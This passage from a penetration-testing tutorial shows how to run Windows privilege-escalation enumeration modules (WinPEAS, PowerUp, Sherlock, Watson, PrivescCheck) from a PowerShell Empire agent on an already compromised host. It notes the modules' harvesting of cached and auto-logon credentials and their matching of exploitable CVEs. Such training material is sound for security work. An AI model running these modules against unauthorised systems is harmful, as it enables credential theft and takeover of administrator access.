<p class="ai-optimize-138"><span style="color: #000000;">In the previous step, we executed WinPEAS starting from a meterpreter shell. We can see that it is working properly with the colours that we discussed earlier. IT tells us about the Basic System Information. It even detects that it is a Virtual Machine. Using the build number of the target machine detects the exploits that it is vulnerable to.</span></p>
<p class="ai-optimize-139"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-Eg8sH24OqUc/YDuZrSTNv6I/AAAAAAAAuVI/qC0P-pFNKccXbgf1Q7Cm5vMK4FyKas1nwCLcBGAsYHQ/s16000/28.png"/></span></p>
<h3 class="ai-optimize-140"><span style="color: #800000;">PowerShell Empire: WinPEAS</span></h3>
<p class="ai-optimize-141"><span style="color: #000000;">Moving on from the Metasploit, if you prefer to use the PowerShell Empire as a tool to compromise the target machine and now are looking for a method to elevate those privileges then there is a WinPEAS script present inside the PowerShell Empire. We select the Agent and then select the module and execute the script on the selected Agent.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/WinPEAS
execute</pre>
<p class="ai-optimize-142"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-G8GP_EXT2LQ/YDuZyMoutiI/AAAAAAAAuVQ/TH8MdVifmZsEqk_UVaxOZHNSu9pCUPN_gCLcBGAsYHQ/s16000/50.png"/></span></p>
<p class="ai-optimize-143"><span style="color: #000000;">As the WinPEAS starts running on the target machine, we can see the Network Interfaces that the target machine is interacting with. It inspects the TCP connects as well.</span></p>
<p class="ai-optimize-144"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-wJSr7Hwz-gg/YDuZ2wExwrI/AAAAAAAAuVY/mHochQWpuRowoaggkhztxOr777BMDw--QCLcBGAsYHQ/s16000/51.png"/></span></p>
<p class="ai-optimize-145"><span style="color: #000000;">WinPEAS performs effectively when it comes to extracting users and Group Policies. Additionally, it will extract any passwords that are cached. It’s possible that a program with credentials will extract them for you if it exists. If not, it will still display the file location that may contain the login information.</span></p>
<p class="ai-optimize-146"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UY2H1CtHWB4/YDuZ9MocUpI/AAAAAAAAuVg/KYjTGiLO-1kaHQkfBIoa7snjLP1mnaPqACLcBGAsYHQ/s16000/52.png"/></span></p>
<h3 class="ai-optimize-147"><span style="color: #800000;">PowerShell Empire: PowerUp</span></h3>
<p class="ai-optimize-148"><span style="color: #000000;">We already worked with PowerUp earlier in this article but what we did was to execute it directly on the shell. This time we will use it from the PowerShell Empire. It provides more stability and is faster on execution. The basic checks are the same that we observed earlier but now we just executed it on an Agent using the following commands.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/powerup/allchecks
execute</pre>
<p><img decoding="async" src="https://1.bp.blogspot.com/-IoPATlwtEcM/YD6thyb4BII/AAAAAAAAuX0/9cPUcKzYIdMYzMqXLq9kRNhfgcb-HSl8QCLcBGAsYHQ/s16000/53.png"/></p>
<p class="ai-optimize-149"><span style="color: #000000;">As before after working for a while, it got on to the Auto Logon, there it found the credentials for the user. It also found the Path for the autorun configs. After extracting these, it goes on to enumerate the schedule tasks as shown in the image below.</span></p>
<p><img decoding="async" src="https://1.bp.blogspot.com/-Ky6nluhzngk/YD6tmLNZq7I/AAAAAAAAuX4/-7MLp_4Ct0ggg6L6mGiD131vQcyIz71LwCLcBGAsYHQ/s16000/54.png"/></p>
<h3 class="ai-optimize-150"><span style="color: #800000;">PowerShell Empire: Sherlock</span></h3>
<p class="ai-optimize-151"><span style="color: #000000;">Once you eliminate the impossible, whatever remains, no matter how improbable, must be the truth. With that supreme quote we are in the mood for executing the Sherlock to the target machine which will snoop for the clues that will help us to elevate privileges on the target machine. We have deployed Sherlock before as well but we did that directly on the shell but this time we have changed the scenario a bit. Instead of the shell we now have an Agent active on the target machine through PowerShell Empire. We will just select the Agent and select the module and execute it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/sherlock
execute</pre>
<p class="ai-optimize-152"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-4TVpu8XYFYw/YDuaNrpoa3I/AAAAAAAAuVs/ArDSJPWglq4Dfw76S-8b2qJA8ZO3D7JLACLcBGAsYHQ/s16000/55.png"/></span></p>
<h3 class="ai-optimize-153"><span style="color: #800000;">PowerShell Empire: Watson</span></h3>
<p class="ai-optimize-154"><span style="color: #000000;">There cannot be a Sherlock without a Watson. There is another module inside the PowerShell Empire that can enumerate the possible vulnerabilities to elevate privileges on the target machine by the name of Watson. It enumerates on the basis of build number and can return the CVE ID to easily exploit the machine and get Administrator Access.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/watson
execute</pre>
<p class="ai-optimize-155"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-NX0DWx6po3E/YDuaU-TFqqI/AAAAAAAAuV0/4eRX-A5v4bIfeIUqM7HE-IO7OqoUzoWugCLcBGAsYHQ/s16000/56.png"/></span></p>
<h3 class="ai-optimize-156"><span style="color: #800000;">PowerShell Empire: Privesccheck</span></h3>
<p class="ai-optimize-157"><span style="color: #000000;">At last, we come to the Privesccheck script. The developers have also integrated it with the PowerShell Empire Framework to provide easy access upon exploiting a Windows Based Machine. We perform all the checks that we discussed previously, but the only change is that now we are loading it as a module to be activated on an active Agent inside the PowerShell Empire.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">usemodule privesc/privesccheck
execute</pre>
<p class="ai-optimize-158"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-bfJowVb4gN4/YDuaZzC39qI/AAAAAAAAuV4/GGTRpFRMG5QLc7iK3wnIL_oLmQGQlDYJgCLcBGAsYHQ/s16000/57.png"/></span></p>
<p class="ai-optimize-159"><span style="color: #000000;">We can see that it is targeting different services and trying to test if they are vulnerable or not. It is also checking that service with different users, Access Rights. It also checks if the current user is able to access that particular service or not.</span></p>
<p class="ai-optimize-160"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-IJNVar4BdBs/YDuaey6JWsI/AAAAAAAAuV8/Ujk0fO20lK0UengavJLeqBeKsyjZD04wgCLcBGAsYHQ/s16000/58.png"/></span></p>
<h3 class="ai-optimize-161"><span style="color: #800000;">Conclusion</span></h3>
<p class="ai-optimize-162"><span style="color: #000000;">The point that we are trying to convey through this article is that there are multiple scripts and executables and batch files to consider while doing Post Exploitation on Windows-Based devices. We wanted this article to serve as your go-to guide whenever you are trying to elevate privilege on a Windows machine irrespective of the way you got your initial foothold.</span></p>
<p class="ai-optimize-163"><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher, and Penetration Tester. Contact on <span style="color: #0000ff;"><strong>Twitter</strong> </span>and <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
